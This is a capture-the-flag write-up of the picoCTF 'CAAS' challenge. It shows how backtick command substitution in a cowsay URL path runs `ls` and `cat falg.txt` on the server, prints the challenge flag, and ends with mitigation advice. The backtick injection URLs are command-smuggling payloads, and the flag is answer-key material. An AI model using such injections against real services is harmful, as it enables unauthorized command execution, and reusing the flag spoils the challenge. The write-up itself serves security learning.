# 🐮 CAAS — Command as a Service

This challenge is pretty easy, as it will **jump to your mind** when you try the link:

> `https://caas.mars.picoctf.net/cowsay/{message}`

Yes, we are going to **OS-inject this** 😏

---

### 🧪 First Try: Direct Injection

Tried:

```
https://caas.mars.picoctf.net/cowsay/{ls }
```

💥 **Did not work**.

![image](https://github.com/user-attachments/assets/17feea2a-d248-4976-b7fd-8be43d8a2c17)

---

### 💡 Idea: Command Substitution using Backticks

Then I thought of using **command substitution**:

```
https://caas.mars.picoctf.net/cowsay/{`ls`}
```

✅ **It worked!**

![image](https://github.com/user-attachments/assets/ffb009a1-ffcf-4c3e-a736-d9b83aeee1ea)

---

### 🏁 Getting the Flag

Saw a file named `falg.txt` (not `flag.txt`, sneaky 🧐)

So:

```
https://caas.mars.picoctf.net/cowsay/{`cat falg.txt`}
```

📦 **Flag retrieved**:

![image](https://github.com/user-attachments/assets/64cfff43-5e6e-476c-bec1-eca8bdc20d19)

```
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

---

## 📚 Lessons Learned

* Always try **multiple payload styles**: what doesn’t work with `{}` might work with backticks.
* Be careful with **file name typos** — sometimes it’s not a mistake, it’s a red herring.
* **Command injection** can be that easy when user input is passed directly to a shell command.
* Never trust inputs in a URL path — especially if you're **interpolating user input in system commands**.

---

## 🔎 Vulnerability Assessment

* This is a classic case of **OS Command Injection** via **unsanitized input** in the URL path.
* The backend likely calls something like:

  ```bash
  cowsay {user_input}
  ```

  and wraps it directly without validation.
* Backtick execution (`\`command\`\`) is evaluated by the shell, so wrapping user input directly into command-line calls **allows attackers to execute arbitrary shell commands**.
* Mitigation would require:

  * **Sanitizing or escaping** special shell characters.
  * Using **whitelisting** instead of blacklisting inputs.
  * Avoiding shell altogether by using **language-native functions** (e.g., Python's subprocess with `shell=False`).

---

💻 That’s it — quick pwn, cute cow, solid vuln.

